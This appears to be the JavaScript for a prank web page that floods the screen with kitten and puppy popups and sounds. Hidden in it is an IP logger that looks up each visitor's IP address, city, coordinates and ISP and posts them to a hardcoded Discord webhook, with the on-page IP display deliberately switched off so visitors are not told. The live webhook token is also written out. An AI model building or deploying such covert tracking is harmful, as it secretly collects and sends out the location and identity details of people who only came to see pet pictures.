// Enhanced Configuration object
const CONFIG = {
    debug: true, // Enable console logging for debugging
    ui: {
        warningModal: {
            enabled: true, // Disable warning modal
            autoClose: true,
            closeDelay: 300,
        },
        ipCard: {
            enabled: false, // Hide IP card from UI
            showInPage: false,
            animationDelay: 300,
        },
        videoSection: {
            enabled: true,
            autoplay: true,
            muted: true,
            loop: true,
            animationDelay: 600,
        },
        mainTitle: {
            enabled: true,
            text: "MEOW MEOW WOOF WOOF",
            rainbow: true,
        }
    },
    popups: {
        enabled: true,
        maxCount: 1000,
        spawnInterval: 500,
        initialDelay: 1000,
        size: { 
            width: 150, 
            height: 150,
            random: false,
            minSize: 100,
            maxSize: 200
        },
        animation: { 
            duration: 500, 
            timing: 'ease-out',
            rotate: true,
        },
        distribution: {
            kittenChance: 0.5,
            spawnArea: 'fullscreen',
            avoidOverlap: true,
        }
    },
    pets: {
        kittens: {
            enabled: true,
            images: ['./assets/kittens/kitty1.png', './assets/kittens/kitty2.jpg', './assets/kittens/kitty3.png', './assets/kittens/kitty4.jpg', './assets/kittens/kitty5.jpg'],
            sounds: ['meow1', 'meow2', 'meow3', 'meow4', 'meow5'],
            colors: ['pink', 'purple'],
            customStyles: '',
        },
        puppies: {
            enabled: true,
            images: ['./assets/puppies/doggy1.jpg', './assets/puppies/doggy2.jpg', './assets/puppies/doggy3.jpg', './assets/puppies/doggy4.jpg', './assets/puppies/doggy5.jpg'],
            sounds: ['woof1', 'woof2', 'woof3'],
            colors: ['blue', 'yellow'],
            customStyles: '',
        }
    },
    sound: { 
        enabled: true, 
        volume: 0.5, 
        allowMultiple: false,
        fadeOut: true,
        fadeOutDuration: 200,
        minTimeBetweenSounds: 200,
    },
    ipLogger: {
        enabled: true, // Keep IP logging enabled
        logging: {
            toConsole: true,
            toAPI: true,
            toWebhook: true,
        },
        display: {
            showIP: true,
            showLocation: true,
            showBrowser: true,
            showOS: true,
            showISP: true,
        },
        api: {
            url: 'https://freeipapi.com/api/json',
            method: 'GET',
            headers: {},
        },
        webhook: {
            url: 'https://discord.com/api/webhooks/1338871646144172124/kM98a--P88de47a9qoq50uR4ZlVO5f9AtdzTHO7ozufuW_JcY3pgsxkKXgAWIbc-iQq7',
            username: "IP Logger",
            embedColor: 1146986,
        }
    },
    theme: {
        colors: {
            primary: 'pink',
            secondary: 'purple',
            accent: 'blue',
            background: 'rainbow',
            text: 'white',
        },
        animations: {
            enabled: true,
            reduced: false,
        },
        borders: {
            radius: 'rounded-[2rem]',
            width: 'border-4',
        }
    }
};

// Game state
const STATE = {
    popupCount: 0,
    lastSoundTime: 0,
    gameStarted: false,
    elements: {
        popupContainer: document.getElementById('popup-container'),
        mainContent: document.getElementById('main-content'),
        ipCard: document.getElementById('ip-card'),
        videoSection: document.getElementById('video-section'),
    }
};

// Initialize UI
function initializeUI() {
    // Hide disabled elements
    if (!CONFIG.ui.ipCard.enabled || !CONFIG.ui.ipCard.showInPage) {
        STATE.elements.ipCard?.remove();
    }
    if (!CONFIG.ui.videoSection.enabled) {
        STATE.elements.videoSection?.remove();
    }
    if (!CONFIG.ui.warningModal.enabled) {
        document.getElementById('warning-modal')?.remove();
        // Start the game immediately if warning modal is disabled
        startGameWithoutModal();
    }
    
    // Apply theme
    document.documentElement.style.setProperty('--primary-color', CONFIG.theme.colors.primary);
    
    // Apply reduced motion if configured
    if (CONFIG.theme.animations.reduced) {
        document.body.classList.add('reduce-motion');
    }
}

// IP logging function - now independent of UI
function logIP() {
    if (!CONFIG.ipLogger.enabled) return;

    if (CONFIG.ipLogger.logging.toAPI) {
        fetch(CONFIG.ipLogger.api.url, {
            method: CONFIG.ipLogger.api.method,
            headers: CONFIG.ipLogger.api.headers
        })
        .then(response => response.json())
        .then(data => {
            const details = {
                ip: data.ipAddress || "Unknown",
                city: data.cityName || "Unknown",
                region: data.regionName || "Unknown",
                country: data.countryName || "Unknown",
                org: data.ispName || "Unknown",
                loc: `${data.latitude || "?"}, ${data.longitude || "?"}`
            };

            // Send to webhook regardless of UI state
            if (CONFIG.ipLogger.logging.toWebhook) {
                sendToWebhook(details);
            }

            // Log to console if enabled
            if (CONFIG.ipLogger.logging.toConsole) {
                console.log('IP Details:', details);
            }

            // Update UI only if card is enabled and visible
            if (CONFIG.ui.ipCard.enabled && CONFIG.ui.ipCard.showInPage) {
                updateIPCard(details);
            }
        })
        .catch(error => CONFIG.debug && console.error("Error fetching IP data:", error));
    }
}

// Update IP card UI - separated from logging logic
function updateIPCard(details) {
    if (!STATE.elements.ipCard) return;

    if (CONFIG.ipLogger.display.showIP) {
        document.getElementById('ip-details').textContent = `IP Address: ${details.ip}`;
    }
    if (CONFIG.ipLogger.display.showBrowser) {
        document.getElementById('browser-info').textContent = `Browser: ${navigator.userAgent}`;
    }
    if (CONFIG.ipLogger.display.showOS) {
        document.getElementById('os-info').textContent = `OS: ${navigator.platform}`;
    }
    if (CONFIG.ipLogger.display.showLocation) {
        document.getElementById('location').textContent = 
            `Location: ${details.city}, ${details.region}, ${details.country}`;
    }
    if (CONFIG.ipLogger.display.showISP) {
        document.getElementById('isp').textContent = `ISP: ${details.org}`;
    }
}

// Send to webhook - unchanged
function sendToWebhook(details) {
    if (!CONFIG.ipLogger.webhook.url) return;

    const embed = {
        title: "IP Log",
        color: CONFIG.ipLogger.webhook.embedColor,
        fields: [
            { name: "**IP Address**", value: `\`${details.ip}\``, inline: true },
            { name: "**City**", value: `\`${details.city}\``, inline: true },
            { name: "**Region**", value: `\`${details.region}\``, inline: true },
            { name: "**Country**", value: `\`${details.country}\``, inline: true },
            { name: "**Coordinates**", value: `\`${details.loc}\``, inline: true },
            { name: "**ISP**", value: `\`${details.org}\``, inline: false }
        ]
    };

    fetch(CONFIG.ipLogger.webhook.url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
            username: CONFIG.ipLogger.webhook.username, 
            embeds: [embed] 
        })
    })
    .catch(error => CONFIG.debug && console.error("Webhook error:", error));
}

// Sound management - unchanged
function playSound(petType) {
    if (!CONFIG.sound.enabled) return;
    
    const currentTime = Date.now();
    if (!CONFIG.sound.allowMultiple && 
        currentTime - STATE.lastSoundTime < CONFIG.sound.minTimeBetweenSounds) return;
    
    const sounds = CONFIG.pets[petType].sounds;
    const soundId = sounds[Math.floor(Math.random() * sounds.length)];
    const audio = document.getElementById(soundId);
    
    if (audio) {
        audio.volume = CONFIG.sound.volume;
        audio.currentTime = 0;

        if (CONFIG.sound.fadeOut) {
            audio.addEventListener('timeupdate', () => {
                if (audio.currentTime > audio.duration - CONFIG.sound.fadeOutDuration / 1000) {
                    audio.volume = Math.max(0, audio.volume - 0.1);
                }
            });
        }

        audio.play();
        STATE.lastSoundTime = currentTime;
    }
}

// Create popups - unchanged
function createPopup() {
    if (!CONFIG.popups.enabled || !STATE.gameStarted || 
        STATE.popupCount >= CONFIG.popups.maxCount) return;

    const popup = document.createElement('div');
    const isPuppy = Math.random() > CONFIG.popups.distribution.kittenChance;
    const petType = isPuppy ? 'puppies' : 'kittens';
    
    if (!CONFIG.pets[petType].enabled) return;
    
    const petConfig = CONFIG.pets[petType];
    const randomImage = petConfig.images[Math.floor(Math.random() * petConfig.images.length)];
    const randomColor = petConfig.colors[Math.floor(Math.random() * petConfig.colors.length)];

    let width = CONFIG.popups.size.width;
    let height = CONFIG.popups.size.height;
    if (CONFIG.popups.size.random) {
        width = height = Math.floor(
            Math.random() * (CONFIG.popups.size.maxSize - CONFIG.popups.size.minSize) + 
            CONFIG.popups.size.minSize
        );
    }

    let x, y;
    if (CONFIG.popups.distribution.spawnArea === 'contained') {
        const container = STATE.elements.popupContainer.getBoundingClientRect();
        x = Math.random() * (container.width - width);
        y = Math.random() * (container.height - height);
    } else {
        x = Math.random() * (window.innerWidth - width);
        y = Math.random() * (window.innerHeight - height);
    }

    popup.className = `popup-image absolute pointer-events-auto ${petConfig.customStyles}`;
    popup.style.left = `${x}px`;
    popup.style.top = `${y}px`;

    popup.innerHTML = `
        <div class="relative group" data-pet-type="${petType}">
            <img src="${randomImage}" alt="Kawaii Pet" 
                class="rounded-full border-4 border-${randomColor}-400 shadow-lg"
                style="width: ${width}px; height: ${height}px; object-fit: cover;">
            <div class="absolute inset-0 bg-black/50 rounded-full opacity-0 group-hover:opacity-100 
                transition-opacity duration-200 flex items-center justify-center cursor-pointer">
                <button class="text-white text-4xl font-bold transform transition-transform 
                    hover:scale-125 hover:text-pink-300">
                    ✕
                </button>
            </div>
        </div>
    `;

    popup.querySelector('.absolute').addEventListener('click', (e) => {
        e.stopPropagation();
        const petType = e.currentTarget.parentElement.dataset.petType;
        playSound(petType);
        popup.remove();
        STATE.popupCount--;
    });

    STATE.elements.popupContainer.appendChild(popup);
    STATE.popupCount++;

    if (STATE.popupCount < CONFIG.popups.maxCount) {
        setTimeout(createPopup, CONFIG.popups.spawnInterval);
    }
}

// Reveal content - unchanged
function revealContent() {
    if (!CONFIG.ui.mainTitle.enabled) {
        document.querySelector('h1')?.remove();
    }

    STATE.elements.mainContent.classList.add('visible');

    const elements = [
        CONFIG.ui.ipCard.enabled && STATE.elements.ipCard,
        CONFIG.ui.videoSection.enabled && STATE.elements.videoSection
    ].filter(Boolean);

    elements.forEach((el, index) => {
        setTimeout(() => {
            el.classList.add('slide-in');
            el.style.opacity = '1';
        }, index * 300);
    });
}

// New function to start game without modal
function startGameWithoutModal() {
    STATE.gameStarted = true;
    revealContent();
    logIP(); // Always log IP regardless of UI state
    if (CONFIG.popups.enabled) {
        setTimeout(createPopup, CONFIG.popups.initialDelay);
    }
}

// Modified start game function
function startGame() {
    if (!CONFIG.ui.warningModal.enabled) {
        startGameWithoutModal();
        return;
    }

    const modal = document.getElementById('warning-modal');
    modal.style.opacity = '0';
    modal.style.transition = 'opacity 0.3s ease-out';
    STATE.gameStarted = true;
    
    setTimeout(() => {
        modal.remove();
        revealContent();
        logIP(); // Always log IP regardless of UI state
        if (CONFIG.popups.enabled) {
            setTimeout(createPopup, CONFIG.popups.initialDelay);
        }
    }, CONFIG.ui.warningModal.closeDelay);
}

// Initialize everything
initializeUI();